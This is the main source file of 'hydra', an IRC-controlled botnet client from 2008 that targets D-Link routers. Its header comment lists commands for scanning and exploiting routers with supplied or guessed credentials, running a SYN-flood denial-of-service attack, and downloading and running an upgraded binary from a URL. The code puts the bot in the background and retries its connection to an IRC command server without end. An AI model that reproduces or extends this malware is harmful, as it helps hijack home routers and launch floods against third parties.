/*
 * hydra_main.c
 *
 * (hydra) Simple router (D-Link) irc-based scanner/exploiter/flooder.
 *
 * *** Access Commands:
 *
 * .login     <password>              - login to bot's party-line
 * .logout                            - logout from bot's party-line
 *
 * *** Misc Commands
 * 
 * .upgrade   <url> <binary_name>     - upgrade binary from http url
 * .version                           - show the current version of bot
 * .status                            - show the status of bot
 * .help                              - show this help message
 *
 * *** Scan Commands
 *
 * .scan      <a> <b> <user> <passwd> - scanner/exploit with user:passwd
 * .advscan   <a> <b>                 - scanner/exploit with auto user:passwd
 * .recursive                         - scanner/exploit with localip scan
 * .recrd                             - advscan with local addr (B-range random)
 * .stop                              - stop all actions (scan/flood)
 *
 * *** DDOS Commands:
 *
 * .synflood  <host> <port> <secs>    - standard synflooder
 * 
 * *** IRC Commands:
 *
 * .join      <channel> <password>    - join bot in selected room
 * .part      <channel>               - part bot from selected room
 * .quit                              - kill the current process
 *
 * Copyright (C) 2008 esaltato, <esaltato@autistici.org>.
 *
 */

#include "../include/hydra_hds.h"

int main(int argc, char **argv)
{
  /* socket structure data. */
  sock_t *sp;

  /* daemonize hydra. */
  if (! strncmp(background_mode, "yes", 
    strlen(background_mode)))
    daemonize();

  /* copy bin name */
  __argv = (char *) malloc(strlen(argv[0])+2);
  snprintf(__argv, strlen(argv[0])+1, "%s", argv[0]);

retry:

  /* socket structure memory allocation. */
  sp = (sock_t *) malloc(sizeof(sock_t));

  /* try to connect to irc server. */
  if (connect_to_irc(sp))
  {
    puts("unable to connect");
    free(sp);
    goto retry;
  }

  return EXIT_SUCCESS;
}
